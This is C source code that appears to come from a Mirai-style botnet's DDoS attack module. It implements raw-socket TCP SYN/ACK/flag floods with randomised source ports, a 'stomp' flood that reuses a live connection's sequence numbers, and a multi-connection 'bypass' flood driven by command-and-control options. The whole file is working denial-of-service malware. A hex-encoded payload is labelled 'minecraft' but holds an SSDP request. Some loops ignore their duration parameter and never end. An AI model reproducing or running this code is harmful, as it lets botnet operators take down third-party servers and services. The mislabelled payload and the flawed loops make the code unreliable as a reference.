#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/select.h>
#include <stdint.h>

#include "headers/attacks.h"
#include "headers/rand.h"
#include "headers/utils.h"
#include "headers/cnc_protocol.h"
#include "headers/checksum.h"

#define SIZE 1024

void attack_tcp_raw_common(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len, int ack, int syn, int psh, int rst, int fin, int urg) {
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    int ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    int minecraft = attack_get_opt_int(opts_len, opts, ATK_OPT_MINECRAFT, 0);

    unsigned int seed = time(NULL) ^ getpid();

    char *mcpayload = "\x4D\x2D\x53\x45\x41\x52\x43\x48\x20\x2A\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\x0A\x48\x4F\x53\x54\x3A\x20\x32\x33\x39\x2E\x32\x35\x35\x2E\x32\x35\x35\x2E\x32\x35\x30\x3A\x31\x39\x30\x30\x0A\x4D\x41\x4E\x3A\x20\x22\x73\x73\x64\x70\x3A\x64\x69\x73\x63\x6F\x76\x65\x72\x22\x0A\x4D\x58\x3A\x20\x35\x0A\x53\x54\x3A\x20\x75\x72\x6E\x3A\x73\x63\x68\x65\x6D\x61\x73\x2D\x75\x70\x6E\x70\x2D\x6F\x72\x67\x3A\x64\x65\x76\x69\x63\x65\x3A\x4D\x61\x6E\x61\x67\x65\x61\x62\x6C\x65\x44\x65\x76\x69\x63\x65\x3A\x31";
    if (minecraft) {
        payload_size = util_strlen(mcpayload);
        ack = 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    char *pkt = malloc(pkt_size);
    if (!pkt) {
        close(sock);
        return;
    }

    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    char *payload = pkt + sizeof(struct iphdr) + sizeof(struct tcphdr);

    util_zero(pkt, pkt_size);
    if (minecraft) {
        util_memcpy(payload, mcpayload, payload_size);
    } else if (payload_size > 0) {
        rand_str(payload, payload_size);
    }

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = inet_addr(ip);
    dst.sin_port = htons(port);

    ipv4_t saddr = util_local_addr();
    if (saddr == 0) saddr = inet_addr("0.0.0.0");

    while (1) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = ip_tos;
        iph->tot_len = htons(pkt_size);
        iph->id = htons(rand_next());
        iph->frag_off = 0;
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = saddr;
        iph->daddr = inet_addr(ip);
        iph->check = 0;
        iph->check = cks((unsigned short*)pkt, sizeof(struct iphdr));

        tcph->source = (sport == 0xffff) ? htons(rand_next() % 65535 + 1) : htons(sport);
        tcph->dest = htons(port);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = ack ? htonl(rand_next()) : 0;
        tcph->doff = 5;
        tcph->fin = fin;
        tcph->syn = syn;
        tcph->rst = rst;
        tcph->psh = psh;
        tcph->ack = ack;
        tcph->urg = urg;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        struct pseudo_hdr {
            uint32_t saddr;
            uint32_t daddr;
            uint8_t zero;
            uint8_t protocol;
            uint16_t len;
        } phdr;

        phdr.saddr = iph->saddr;
        phdr.daddr = iph->daddr;
        phdr.zero = 0;
        phdr.protocol = IPPROTO_TCP;
        phdr.len = htons(sizeof(struct tcphdr) + payload_size);

        char *pseudo_pkt = malloc(sizeof(phdr) + sizeof(struct tcphdr) + payload_size);
        if (pseudo_pkt) {
            util_memcpy(pseudo_pkt, &phdr, sizeof(phdr));
            util_memcpy(pseudo_pkt + sizeof(phdr), tcph, sizeof(struct tcphdr));
            if (payload_size > 0) util_memcpy(pseudo_pkt + sizeof(phdr) + sizeof(struct tcphdr), payload, payload_size);
            tcph->check = cks((unsigned short*)pseudo_pkt, sizeof(phdr) + sizeof(struct tcphdr) + payload_size);
            free(pseudo_pkt);
        }

        sendto(sock, pkt, pkt_size, 0, (struct sockaddr*)&dst, sizeof(dst));
    }

    free(pkt);
    close(sock);
}

void attack_tcp_raw(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int ack = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_ACK, 0);
    int syn = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_SYN, 1);
    int psh = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_PSH, 0);
    int rst = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_RST, 0);
    int fin = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_FIN, 0);
    int urg = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_URG, 0);
    attack_tcp_raw_common(ip, port, duration, opts, opts_len, ack, syn, psh, rst, fin, urg);
}

void attack_tcp_ack(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    attack_tcp_raw_common(ip, port, duration, opts, opts_len, 1, 0, 0, 0, 0, 0);
}

void attack_tcp_syn(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    attack_tcp_raw_common(ip, port, duration, opts, opts_len, 0, 1, 0, 0, 0, 0);
}


void attack_tcp_stomp(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int i, rfd;
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    int data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    int ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    int ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 1);
    int urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_URG, 0);
    int ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_ACK, 1);
    int psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_PSH, 1);
    int rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_RST, 0);
    int syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_SYN, 0);
    int fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_TCP_FIN, 0);

    unsigned int seed = time(NULL) ^ getpid();
    uint32_t target_ip = inet_addr(ip);
    uint32_t seq = 0, ack_seq = 0;
    uint16_t sport = 0, dport = htons(port);
    char *pkt = NULL;

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) return;

    int one = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1) {
        close(rfd);
        return;
    }

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = target_ip;
    target_addr.sin_port = dport;

    while (1) {
        int fd;
        struct sockaddr_in conn_addr;
        conn_addr.sin_family = AF_INET;
        conn_addr.sin_addr.s_addr = target_ip;
        conn_addr.sin_port = dport;

stomp_setup:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            sleep(1);
            continue;
        }

        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        connect(fd, (struct sockaddr *)&conn_addr, sizeof(conn_addr));
        time_t start_recv = time(NULL);

        while (1) {
             char pktbuf[1024];
             struct sockaddr_in recv_addr;
             socklen_t recv_addr_len = sizeof(recv_addr);
             int ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);

             if (ret > (sizeof(struct iphdr) + sizeof(struct tcphdr))) {
                 struct iphdr *iph = (struct iphdr *)pktbuf;
                 struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

                 if (iph->saddr == target_ip && tcph->syn && tcph->ack) {
                     seq = ntohl(tcph->seq);
                     ack_seq = ntohl(tcph->ack_seq);
                     sport = tcph->dest;
                     close(fd);
                     goto start_attack;
                 }
                 else if (tcph->rst || tcph->fin) {
                     close(fd);
                     goto stomp_setup;
                 }
             }

             if (time(NULL) - start_recv > 5) {
                 close(fd);
                 goto stomp_setup;
             }
             usleep(10000);
        }
    }

start_attack:
    pkt = calloc(1, 1510);
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    char *payload = (char *)(tcph + 1);

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = ip_tos;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
    iph->id = htons(rand_next() & 0xffff);
    iph->ttl = ip_ttl;
    if (dont_frag) iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = util_local_addr();
    if (iph->saddr == 0) iph->saddr = inet_addr("0.0.0.0");
    iph->daddr = target_ip;

    tcph->source = sport;
    tcph->dest = dport;
    tcph->doff = 5;
    tcph->urg = urg_fl;
    tcph->ack = ack_fl;
    tcph->psh = psh_fl;
    tcph->rst = rst_fl;
    tcph->syn = syn_fl;
    tcph->fin = fin_fl;
    tcph->window = htons(rand_next() & 0xffff);

    if (data_rand) {
        rand_str(payload, data_len);
    }

    struct pseudo_hdr {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t len;
    } phdr;

    uint32_t current_seq = ack_seq;
    uint32_t current_ack = seq + 1;

    while(1) {
        iph->id = htons(rand_next() & 0xffff);
        iph->check = 0;
        iph->check = cks((unsigned short*)iph, sizeof(struct iphdr));

        tcph->seq = htonl(current_seq);
        tcph->ack_seq = htonl(current_ack);
        tcph->check = 0;

        phdr.saddr = iph->saddr;
        phdr.daddr = iph->daddr;
        phdr.zero = 0;
        phdr.protocol = IPPROTO_TCP;
        phdr.len = htons(sizeof(struct tcphdr) + data_len);

        char *pseudo_pkt = malloc(sizeof(phdr) + sizeof(struct tcphdr) + data_len);
        if(pseudo_pkt) {
            util_memcpy(pseudo_pkt, &phdr, sizeof(phdr));
            util_memcpy(pseudo_pkt + sizeof(phdr), tcph, sizeof(struct tcphdr));
            if(data_len > 0) util_memcpy(pseudo_pkt+sizeof(phdr)+sizeof(struct tcphdr), payload, data_len);
            tcph->check = cks((unsigned short*)pseudo_pkt, sizeof(phdr) + sizeof(struct tcphdr) + data_len);
            free(pseudo_pkt);
        }

        sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
        current_seq += data_len;
    }
}


#define MAX_FDS 128
void attack_tcp_bypass(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len)
{
    BOOL rand_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    uint16_t len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 900);
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, port);

    struct sockaddr_in addr;
    char *buf = calloc(len, sizeof(char));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);
    addr.sin_addr.s_addr = inet_addr(ip);

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    for (int i = 0; i < MAX_FDS; i++)
    {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        int err = 0;
        socklen_t err_len = sizeof(int);

        for(i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
                    fcntl(states[i].fd, F_SETFL, O_NONBLOCK | fcntl(states[i].fd, F_GETFL, 0));

                    errno = 0;
                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(states[i].fd);
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                case 1:
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);

                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

                        if(err)
                        {
                            close(states[i].fd);
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }

                        states[i].state = 2;
                        continue;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                case 2:
                    {
                        int curr_len = len;
                        if (rand_len)
                            curr_len = (rand_next() % (len > 500 ? len - 500 : 1) + (len > 500 ? 500 : 0));

                        rand_str(buf, curr_len);

                        if(send(states[i].fd, buf, curr_len, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                        {
                            close(states[i].fd);
                            states[i].state = 0;
                            states[i].timeout = 0;
                        }
                    }
                    break;
            }
        }
    }

    for (int i = 0; i < MAX_FDS; i++) {
        if (states[i].fd != -1) close(states[i].fd);
    }
    free(buf);
}
